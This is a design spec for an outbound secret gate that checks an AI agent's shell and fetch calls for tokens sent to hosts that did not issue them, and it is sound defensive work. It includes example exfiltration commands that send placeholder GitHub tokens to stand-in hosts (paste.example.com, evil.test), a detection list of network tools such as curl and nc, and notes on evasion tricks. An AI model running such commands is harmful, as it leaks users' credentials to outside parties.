# Customs: An Outbound Secret Gate — Design

**Status:** Approved, not implemented.
**Tracked by:** [ONL-161](https://linear.app/onlooker/issue/ONL-161) (bead `onlooker-cjopx1`).
**Builds on:** [ONL-167](https://linear.app/onlooker/issue/ONL-167), which put the secret
patterns in one lib (`scripts/lib/onlooker-secret-patterns.sh`) and named this plugin
as the reason.
**Scope:** a new `plugins/customs`, one new function in the shared secret-pattern lib,
and three event types in `@onlooker-community/schema`. Package-install checks are
**not** in scope; see [Out of scope](#out-of-scope).

Secret-shaped literals in this document are written with placeholder tails
(`ghp_<24>`, `AKIA<16>`), the same convention ONL-167's spec uses. The repository's
secret scanner blocks a write containing a complete one.

---

## Why

Warden is inbound only. It scans what `WebFetch` and `Read` bring in, and closes a gate
on write-class tools when that content looks hostile. Nothing inspects what the agent
sends out.

Secret handling exists only where things are stored. Lineage and historian redact
before writing to `~/.onlooker`, which protects the local store. Neither stops
`curl -H "Authorization: token ghp_<24>" https://paste.example.com`. A `WebFetch` whose
URL carries a key in its query string isn't stopped either.

Customs is the outbound counterpart. For each `Bash` or `WebFetch` call it asks one
question: is a secret-shaped literal in this call headed to a host that isn't where
that kind of secret belongs?

## What this spec decides

### 1. Secrets only, in v1

The issue named a second slice: package installs with typosquat-shaped names or
unpinned versions. That's a different detector with a different false-positive profile,
and none of its data has been collected yet. It becomes its own issue,
[ONL-204](https://linear.app/onlooker/issue/ONL-204). Shipping both
together would mean tuning two unrelated signals inside one wave.

### 2. A hit asks; it does not deny

On a hit, customs returns `permissionDecision: "ask"`. You see the call and a reason
that names the kind of secret and the host, and you approve or reject it. A fake key
in a test fixture costs one click, not a stalled session. That's the issue's main
risk, false positives, handled by the decision itself and not by tuning.

`mode: "deny"` in config switches to a hard block, for anyone who wants that in
interactive sessions too.

Unattended runs probably need no switch. The hooks reference says that for `"ask"`,
the reason is "shown to the user in the permission prompt. When Claude Code denies the
call in a `-p` run where no one can answer that prompt, Claude reads the reason in the
tool result instead." That implies a `-p` run with nobody to answer is denied.
**Measured 2026-10-25 with Claude Code 2.1.308:** gate-block-contract.bats' ask
canary passes, so a `-p` run denies an ask that nobody answers.

`"ask"` also holds in auto mode. The reference says a hook's `"ask"` "forces a
permission prompt in auto mode: the classifier can still deny the tool call, but it
can't approve the call silently."

### 3. The allowlist pairs a secret's kind with a host

A host on the allowlist is trusted for **its own kinds of secret only**. These pairs
are built in, because in each case the issuer is the obvious destination:

| Kind | Built-in hosts |
|---|---|
| `github_token` | `github.com`, `api.github.com`, `uploads.github.com` |
| `anthropic_key` | `api.anthropic.com` |
| `openai_key` | `api.openai.com` |
| `aws_access_key_id` | `*.amazonaws.com` |

Users add pairs in settings. A pattern matches a host exactly. `*.` matches any
subdomain, and the bare domain too, so `*.amazonaws.com` accepts `amazonaws.com`.

`bearer_token` has no issuer, so it has no built-in pair. Every API takes one, and
`curl -H "Authorization: Bearer …"` to the API that issued it is the most common
deliberate case there is. Gating it would ask on most legitimate token use. In v1 a
bare bearer token is **recorded, not gated**: it emits `customs.egress.flagged` with
`decision: "none"` and the call proceeds. The wave's data decides whether it ever
gates. A bearer whose value matches a specific kind, such as `Bearer ghp_<24>`, is
checked as that kind.

A trusted host for everything was rejected. A host trusted for every kind would
receive secrets it never issued, and a GitHub token sent to api.anthropic.com is
exactly the mistake worth catching.

### 4. Bash: only commands with a network tool are checked

Customs guards egress, not storage. A Bash command is checked only if it runs a known
network tool:

```text
curl  wget  http  https  xh  nc  ncat  ssh  scp  sftp  rsync
gh api   git (with an http(s)://, ssh:// or user@host: remote in the command)
```

The test runs first, as a bash `[[ =~ ]]`, with no subprocess. Most Bash calls don't
match, so they exit before python3 starts. That keeps customs' cost on ordinary shell
use down to the hook's own process start.

If a network tool is present and a secret is detected, the destination comes from:

- URLs: `scheme://host[:port]/…`. The host is lowercased and the port dropped.
- `user@host` and `host:path` arguments to ssh, scp, sftp and rsync.
- git remotes written in the command.

Every host found is checked. **If no host can be read, the call asks.** A secret
headed somewhere customs can't name is not a pass. The motivating case is
`curl "$(cat url.txt)" -H "Authorization: token ghp_<24>"`.

A secret in a command with no network tool passes. That covers `export`, an `echo`
into `.env`, and `op` writes. Asking there would gate storage, which is not this
plugin's job.

### 5. WebFetch: the URL is the text and the destination

The whole URL is scanned, and its host is the destination. The prompt is not scanned,
because WebFetch never sends it to the URL's host.

### 6. Detection reuses ONL-167's table, and reports kind

`scripts/lib/onlooker-secret-patterns.sh` gains a second function over the same
pattern table:

```text
onlooker_detect_secrets '<json array of strings>'
  stdout: JSON array of {"kinds": [string, ...]}, element i for input i
```

`TOKEN_PATTERNS` becomes a list of `(kind, pattern)` pairs, and both functions read
it. `onlooker_redact_secrets` behaves exactly as before. Its tests are the regression
guard. Detection replaces each match as it goes, in table order, which is the same
ordering redaction relies on, so an Anthropic key is `anthropic_key` and never
`openai_key` too.

**Customs gates on token patterns only, not `KV_PATTERN`.** `KEY=value` is right for
redaction, where a false positive costs a placeholder in a stored transcript. As a gate
trigger, a false positive costs a prompt, and `max_output_tokens: 192` matches it.
`onlooker_detect_secrets` doesn't report KV matches at all, so no caller can gate on
them by accident.

The lib reaches customs through `sync-shared-libs.sh`'s `ON_DEMAND_LIBS`, like every
other consumer. An on-demand lib is refreshed in every plugin that already holds a
copy, so customs gets it by having the file seeded once, with no list to edit.
`shared-lib-vendoring.bats` already fails if a vendored copy drifts.

### 7. Customs fails open, and says so

This is the reverse of the lib's own policy, so it needs its reason. The lib fails
closed because a redactor that fails open writes the secret to disk. A gate on every
Bash call that fails closed turns a missing python3 into a session where no shell
command runs. The likely response is to disable customs entirely, which is a worse
outcome than one unchecked call.

So any internal error, whether python3 missing, unparseable hook input or a lib
failure, emits `customs.check.failed` with the stage that failed and exits 0. Claude
Code makes the same choice for a gate that times out: "The call continues through the
normal permission flow, so don't count on a stalled hook to act as a gate."

`customs.check.failed` has the `failed` role, so a customs instance that fails silently
shows up on the hosted Sessions page as a failure, not as quiet.

### 8. Precedence with warden and compass needs no arbiter

The issue asked for a precedence spike before customs ships enabled. The hooks
reference answers it:

> When multiple PreToolUse hooks return different decisions, precedence is `deny` >
> `defer` > `ask` > `allow`.

Customs only ever returns `ask`, `deny` or nothing. When warden's closed gate denies a
Bash call, the call is denied whatever customs says. When compass denies a write,
customs isn't involved, since it doesn't match Write, Edit or MultiEdit. Customs can
never loosen another gate's decision. At most it adds a prompt to a call the others
allowed. The planned `arbiter` plugin in `docs/plugin-catalog.md` isn't needed for
this, and one contract test pins it (see [Testing](#testing)).

## Events

Registered in `@onlooker-community/schema` and released as a minor version
**before** the plugin ships, the order ONL-191 used. Each gets a role in
`EVENT_TYPE_ROLES`.

| Type | Role | Payload |
|---|---|---|
| `customs.egress.flagged` | `output` | `tool`, `kinds[]`, `hosts[]` (empty when unreadable), `decision` (`ask` \| `deny` \| `none`) |
| `customs.egress.allowed` | `skipped` | `tool`, `kinds[]`, `hosts[]` |
| `customs.check.failed` | `failed` | `tool`, `stage` (`input` \| `detect` \| `destination` \| `config`) |

**Payloads carry kind and host, never the secret, the command or the URL path.** An
event about a leak must not be the leak. A host is envelope-level information: it says
where, not what.

No event is emitted when a call has no network tool, or when it has one but no
secret. That's the common path, and emitting on it would write an event for every
Bash call.

## Config

The plugin's `config.json` holds the defaults, and the settings overlay
(`.claude/settings.json`, key `customs`) deep-merges over them through the substrate's
`config-loader.sh`, like warden and compass:

```json
{
  "customs": {
    "mode": "ask",
    "pairs": {},
    "record_only_kinds": ["bearer_token"]
  }
}
```

A settings file adds its own pairs, such as
`"pairs": {"github_token": ["ghe.example.com"]}`.

The built-in pairs from section 3 live in code (`customs-allowlist.sh`), not in
`config.json`. That's because of how the config loader merges: its `deepmerge`
merges objects but **replaces arrays**. With the built-ins in `config.json`, one user
pair for `github_token` would silently drop `github.com`. Keeping them in code makes
user pairs **add** to a kind's hosts, which is the only behavior offered. Replacing
them is deliberately not offered: nobody needs to stop GitHub tokens reaching GitHub,
and a replace option would let one settings line wipe the whole table. `mode` accepts
`ask` or `deny`. Any other value is treated as `ask` and emits `customs.check.failed`
with `stage: "config"`.

## Code shape

```text
scripts/lib/onlooker-secret-patterns.sh     + onlooker_detect_secrets, kind-labeled table
plugins/customs/
  .claude-plugin/plugin.json
  hooks/hooks.json                          PreToolUse: Bash, WebFetch
  config.json
  scripts/hooks/customs-pre-tool-use.sh     input -> prefilter -> detect -> destination -> decide
  scripts/lib/customs-destination.sh        host extraction (URLs, user@host, host:path)
  scripts/lib/customs-allowlist.sh          built-in pairs, kind x host matching, the decision
  scripts/lib/customs-config.sh             config_load_plugin wrapper, like warden-config.sh
  scripts/lib/customs-events.sh             customs.* emission, like warden-events.sh
  scripts/lib/onlooker-secret-patterns.sh   seeded once, then kept current by sync-shared-libs.sh
  README.md  CHANGELOG.md
test/bats/customs-*.bats
```

Plus the catalog entry in `docs/plugin-catalog.md`.

## Testing

Fixture secrets are built at runtime by string concatenation, as
`historian-session-end.bats` does, so the repository's own secret scanner never sees
a complete literal.

- **Detection by kind.** Each pattern yields its own kind. An Anthropic key is
  `anthropic_key` only. `KV_PATTERN` matches yield no kind. `onlooker_redact_secrets`'
  existing tests pass unchanged.
- **Destination extraction.** Quoted URLs, a URL inside `-H` and `--url`, ports,
  uppercase hosts, `user@host:path`, pipes, `$(…)`, and multiple hosts in one command.
  Each case states whether a host is readable.
- **Decisions, end to end through the hook:**
  - token to its issuer: no output, `allowed` event;
  - token to another host: `ask` payload;
  - `mode: deny`: `deny` payload;
  - no readable host: `ask`;
  - secret with no network tool: no output, no event;
  - bare bearer: no output, `flagged` with `decision: "none"`;
  - `Bearer ghp_<24>` to a non-GitHub host: `ask`.
- **The reason never contains the secret.** Assert the fixture's value is absent from
  stdout and from every emitted event.
- **Fail open.** With python3 hidden from `PATH`, the hook exits 0 with no output and
  emits `customs.check.failed` with `stage: "detect"`.
- **Contract shape.** The `ask` and `deny` payloads match `gate-block-contract.bats`'
  `hookSpecificOutput` shape.
- **Precedence.** One bats test runs warden's pre-tool-use with a closed gate and
  customs on the same flagged Bash call, and asserts the strictest decision is `deny`.
  This pins section 8 in this repo, not only in Claude Code's docs.
- **Headless `ask`.** One manual `claude -p` run of a flagged call, with the result
  recorded in this spec, before the README says what unattended runs get.
- **Ablation.** Disable each check (the prefilter, the pairing, the no-host rule, the
  payload scrub) and confirm its test fails.

## Rollout

Opt-in: customs does nothing until it's enabled. It joins a dogfood wave **last**, as
compass did, enabled in this repo's committed settings. The wave reads:

- `customs.egress.flagged` against `customs.egress.allowed`, by kind and host: how
  often it asks, and on what;
- how many asks were approved, from your own account of them. Claude Code records no
  event for the answer to a permission prompt, so the plugin can't count this. That
  limit goes in the wave's notes, not under a metric that would read as zero;
- `customs.check.failed` by stage, expected to be zero;
- hook-health p50 for `customs-pre-tool-use` on Bash calls with no network tool,
  against the substrate's bare hook start.

## Out of scope

- **Package installs** (typosquat-shaped names, unpinned versions): ONL-204.
- **Secrets referenced through variables** (`$GITHUB_TOKEN`, `op run`). The command
  text never holds the value, so there's nothing to match, and expanding variables
  would mean reading the environment, which customs doesn't do.
- **Indirect egress:** a script run by the command that sends the secret later. Customs
  sees the call it's given, not what that call does next.
- **Request bodies read from files** (`curl -d @file`). Customs doesn't read files.
- **An arbiter.** Section 8 shows none is needed here.

## Risks

- **Bash parsing is heuristic.** A host hidden in a variable or built at runtime isn't
  readable, and that case asks. That's the safe direction, and it costs a prompt.
  The same holds when only some of a call's hosts are unreadable. A candidate
  that fails to parse (`https://[::1]/`, an underscore, more than 253 characters)
  makes the whole call ask, even when another host was read and allowed. An
  earlier draft filtered such candidates out, and the Task 3 review showed what
  that does: `curl https://ok.test/x; curl https://evil.test` read only
  `ok.test`, because the `;` made `evil.test` unparseable and the filter dropped
  it. A tool named by path (`/usr/bin/curl`, `./nc`) counts as a network tool too.
  The final review found three more ways a readable host could carry a call,
  and each now asks instead. A command in the line that runs a network tool
  but names no readable host (`echo https://api.github.com; nc evil.test 80`)
  makes the call unreadable; the line is split on `;`, `|`, `&`, parentheses,
  backticks and newlines, ignoring quotes. curl, wget, http, https and xh read
  a bare `name.tld` word as a host, so `curl … evil.test/x` lists evil.test.
  A candidate shaped like a secret (`https://<key>.evil.test/`) is unreadable
  and never logged. A WebFetch URL with a backslash, whitespace or a control
  character is unreadable, because a URL parser reads it differently from
  grep. A tool opened by a quote (`sh -c 'curl …'`) is seen as well.
  Command text crafted to evade customs (quote concatenation, curl's
  `--connect-to`) is out of scope: customs assumes it is not.
- **Ask fatigue.** If some legitimate pair comes up often, the answer is a settings
  pair, and the wave's data says which pairs to build in. If asks come mostly from
  test fixtures, the next step is a skip for fixture paths, not loosening the default.
- **The shared lib's table change touches redaction.** Labeling `TOKEN_PATTERNS` by
  kind must not change what redaction does. The existing redaction tests are the
  guard, and they run unchanged.
